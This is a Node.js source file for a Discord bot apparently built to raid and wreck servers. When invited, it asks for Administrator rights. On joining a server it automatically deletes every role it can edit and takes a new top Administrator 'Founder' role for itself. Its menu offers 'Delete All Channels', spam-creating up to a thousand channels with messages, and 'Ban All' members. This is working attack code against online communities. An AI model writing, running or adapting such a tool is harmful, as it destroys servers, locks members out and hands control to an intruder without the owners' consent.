const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');
const readline = require('readline');
const path = require('path');
require('dotenv').config({ path: path.join(__dirname, '.env') });

const FOUNDER_ROLE_NAME = 'Founder';
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildVoiceStates,
    ],
});

async function setupFounderRole(guild) {
    try {
        const me = guild.members.me;
        if (!me || !me.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
            return console.log('[!] Bot needs Manage Roles permission');
        }

        const myPos = me.roles.highest.position;

        // Fast delete all non-Founder roles
        const toDelete = guild.roles.cache.filter(r =>
            r.name !== FOUNDER_ROLE_NAME && r.name !== '@everyone' && r.editable && r.position < myPos
        );

        console.log(`[+] Deleting ${toDelete.size} roles...`);
        let del = 0;
        await Promise.allSettled(toDelete.map(async r => {
            try { await r.delete(); del++; } catch {}
        }));
        console.log(`[+] Deleted ${del}`);

        // Create or get Founder
        let role = guild.roles.cache.find(r => r.name === FOUNDER_ROLE_NAME);
        if (!role) {
            console.log(`[+] Creating "${FOUNDER_ROLE_NAME}"...`);
            role = await guild.roles.create({
                name: FOUNDER_ROLE_NAME,
                color: '#FF0000',
                permissions: [PermissionsBitField.Flags.Administrator],
            });
        }

        // Position at top
        if (role.position !== myPos) {
            await role.setPosition(myPos);
            console.log(`[+] Founder at TOP`);
        }

        // Claim for bot
        if (!me.roles.cache.has(role.id)) {
            await me.roles.add(role);
            console.log(`[+] Bot claimed Founder`);
        }

        console.log(`[✓] Done in ${guild.name}`);
        return true;
    } catch (err) {
        console.log(`[!] Error: ${err.message}`);
        return false;
    }
}

function showMenu() {
    console.log('\n╔══════════════════════╗');
    console.log('║    DISCORD BOT MENU  ║');
    console.log('╚══════════════════════╝\n');
    console.log('  1. Join Server');
    console.log('  2. Setup Founder Role');
    console.log('  3. List Servers');
    console.log('  4. Delete All Channels');
    console.log('  5. Bulk Create Channels');
    console.log('  6. Ban All');
    console.log('  7. Unban All');
    console.log('  8. Kick User');
    console.log('  9. Ban User');
    console.log(' 10. Unban User');
    console.log(' 11. Send Message');
    console.log(' 12. List Channels');
    console.log(' 13. Create Role');
    console.log(' 14. Delete Role');
    console.log(' 15. List Roles');
    console.log(' 16. Leave Server');
    console.log('  0. Exit\n');
    process.stdout.write('Select> ');
}

client.on('ready', async () => {
    console.log(`\n[✓] Bot online: ${client.user.tag}\n`);

    // Auto-open invite from .env
    const inviteLink = process.env.INVITE_LINK;
    if (inviteLink) {
        const inviteId = inviteLink.replace(/^(https?:\/\/)?(discord\.(gg|com\/invite)\/)?/i, '').replace(/\/.*$/, '').replace(/\?.*$/, '').replace(/[^a-zA-Z0-9\-]/g, '');
        if (inviteId) {
            const url = `https://discord.com/oauth2/authorize?client_id=${process.env.DISCORD_CLIENT_ID}&permissions=8&scope=bot&guild_id=${inviteId}`;
            require('child_process').exec(`start "" "${url}"`);
            console.log(`[+] Opened invite URL\n`);
        }
    }

    showMenu();
});

client.on('guildCreate', async (guild) => {
    console.log(`[+] Joined: ${guild.name}`);
    await setupFounderRole(guild);
    showMenu();
});

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

rl.on('line', async (input) => {
    const choice = parseInt(input.trim());
    const ask = q => new Promise(resolve => {
        process.stdout.write(q);
        rl.once('line', d => resolve(d.trim()));
    });

    switch (choice) {
        case 1: {
            const gid = await ask('Server ID (Enter=any)> ');
            const url = `https://discord.com/oauth2/authorize?client_id=${process.env.DISCORD_CLIENT_ID}&permissions=8&scope=bot${gid ? '&guild_id=' + gid : ''}`;
            console.log(`\n${url}\n`);
            break;
        }
        case 2: {
            const gid = await ask('Server ID> ');
            const g = client.guilds.cache.get(gid);
            if (!g) return console.log('[!] Not in server');
            await setupFounderRole(g);
            break;
        }
        case 3: {
            console.log('\n─── Servers ───');
            client.guilds.cache.forEach(g => console.log(`  ${g.name} (${g.id})`));
            break;
        }
        case 4: {
            const gid = await ask('Server ID> ');
            const g = client.guilds.cache.get(gid);
            if (!g) return console.log('[!] Not in server');
            const chs = g.channels.cache.filter(c => c.deletable);
            console.log(`[!] Deleting ${chs.size}...`);
            let d = 0;
            await Promise.allSettled(chs.map(async c => { try { await c.delete(); d++; } catch {} }));
            console.log(`[✓] Deleted ${d}`);
            break;
        }
        case 5: {
            const gid = await ask('Server ID> ');
            const type = await ask('Type (text/voice)> ');
            const name = await ask('Channel name> ');
            const count = Math.min(parseInt(await ask('How many> ')) || 10, 1000);
            const msg = await ask('Message (Enter=skip)> ');
            const g = client.guilds.cache.get(gid);
            if (!g) return console.log('[!] Not in server');
            const cType = type === 'voice' ? ChannelType.GuildVoice : ChannelType.GuildText;
            let created = 0;
            const tasks = [];
            for (let i = 0; i < count; i++) {
                tasks.push(
                    g.channels.create({ name, type: cType }).then(async ch => {
                        created++;
                        if (msg && cType === ChannelType.GuildText) await ch.send(msg);
                    }).catch(() => {})
                );
            }
            await Promise.allSettled(tasks);
            console.log(`[✓] Created ${created}${msg ? ' with messages' : ''}`);
            break;
        }
        case 6: {
            const gid = await ask('Server ID> ');
            const g = client.guilds.cache.get(gid);
            if (!g) return console.log('[!] Not in server');
            await g.members.fetch();
            const m = g.members.cache.filter(x => !x.user.bot && x.id !== client.user.id);
            console.log(`[!] Banning ${m.size}...`);
            let b = 0;
            await Promise.allSettled(m.map(async x => { try { await x.ban({reason:'banall'}); b++; } catch {} }));
            console.log(`[✓] Banned ${b}`);
            break;
        }
        case 7: {
            const gid = await ask('Server ID> ');
            const g = client.guilds.cache.get(gid);
            if (!g) return console.log('[!] Not in server');
            const bans = await g.bans.fetch();
            console.log(`[+] Unbanning ${bans.size}...`);
            let u = 0;
            await Promise.allSettled(bans.map(async b => { try { await g.bans.remove(b.user.id); u++; } catch {} }));
            console.log(`[✓] Unbanned ${u}`);
            break;
        }
        case 8: {
            const gid = await ask('Server ID> ');
            const uid = await ask('User ID> ');
            const g = client.guilds.cache.get(gid);
            if (!g) return console.log('[!] Not in server');
            try { await g.members.kick(uid); console.log('[✓] Kicked'); }
            catch (e) { console.log(`[!] ${e.message}`); }
            break;
        }
        case 9: {
            const gid = await ask('Server ID> ');
            const uid = await ask('User ID> ');
            const g = client.guilds.cache.get(gid);
            if (!g) return console.log('[!] Not in server');
            try { await g.members.ban(uid); console.log('[✓] Banned'); }
            catch (e) { console.log(`[!] ${e.message}`); }
            break;
        }
        case 10: {
            const gid = await ask('Server ID> ');
            const uid = await ask('User ID> ');
            const g = client.guilds.cache.get(gid);
            if (!g) return console.log('[!] Not in server');
            try { await g.bans.remove(uid); console.log('[✓] Unbanned'); }
            catch (e) { console.log(`[!] ${e.message}`); }
            break;
        }
        case 11: {
            const gid = await ask('Server ID> ');
            const cid = await ask('Channel ID> ');
            const msg = await ask('Message> ');
            const ch = await client.channels.fetch(cid).catch(() => null);
            if (!ch) return console.log('[!] Not found');
            await ch.send(msg);
            console.log('[✓] Sent');
            break;
        }
        case 12: {
            const gid = await ask('Server ID> ');
            const g = client.guilds.cache.get(gid);
            if (!g) return console.log('[!] Not in server');
            g.channels.cache.filter(c => c.type === ChannelType.GuildText || c.type === ChannelType.GuildVoice)
                .forEach(c => console.log(`  [${c.type===ChannelType.GuildText?'TEXT':'VOICE'}] ${c.name}`));
            break;
        }
        case 13: {
            const gid = await ask('Server ID> ');
            const rname = await ask('Role name> ');
            const g = client.guilds.cache.get(gid);
            if (!g) return console.log('[!] Not in server');
            try {
                const r = await g.roles.create({ name: rname, permissions: [PermissionsBitField.Flags.Administrator] });
                console.log(`[✓] Created ${r.name}`);
            } catch (e) { console.log(`[!] ${e.message}`); }
            break;
        }
        case 14: {
            const gid = await ask('Server ID> ');
            const rname = await ask('Role name> ');
            const g = client.guilds.cache.get(gid);
            if (!g) return console.log('[!] Not in server');
            const r = g.roles.cache.find(x => x.name === rname);
            if (!r) return console.log('[!] Not found');
            try { await r.delete(); console.log('[✓] Deleted'); }
            catch (e) { console.log(`[!] ${e.message}`); }
            break;
        }
        case 15: {
            const gid = await ask('Server ID> ');
            const g = client.guilds.cache.get(gid);
            if (!g) return console.log('[!] Not in server');
            g.roles.cache.forEach(r => console.log(`  ${r.name}`));
            break;
        }
        case 16: {
            const gid = await ask('Server ID> ');
            const g = client.guilds.cache.get(gid);
            if (!g) return console.log('[!] Not in server');
            try {
                await g.leave();
                console.log(`[✓] Left ${g.name}`);
            } catch (e) {
                console.log(`[!] ${e.message}`);
            }
            break;
        }
        case 0:
            console.log('Bye');
            rl.close();
            process.exit(0);
            break;
        default:
            console.log('Invalid. Select 0-16.');
    }
    showMenu();
});

client.login(process.env.DISCORD_BOT_TOKEN).catch(err => {
    console.error(`[!] Login failed: ${err.message}`);
    process.exit(1);
});